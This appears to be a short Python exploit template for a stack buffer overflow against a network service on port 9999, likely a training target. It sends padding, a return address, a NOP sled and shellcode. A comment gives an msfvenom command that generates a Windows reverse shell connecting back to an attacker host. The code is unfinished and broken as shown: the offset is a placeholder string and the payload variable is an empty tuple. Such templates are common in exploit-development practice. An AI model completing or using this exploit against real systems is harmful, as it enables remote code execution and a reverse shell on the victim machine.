#!/usr/bin/python
import sys, socket

overflow = ()

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.143.129 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00" ** DELETE THE ; at the end!!!!

shellcode = "A" * "OFFSET VALUE HERE" + "\xaf\x11\x50\x62" + "\x90"  * 32 + overflow

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.1.221',9999))
        s.send(('COMMAND  /.:/' + shellcode))
        s.close()

except:
        print "Error connecting to server"
        sys.exit()
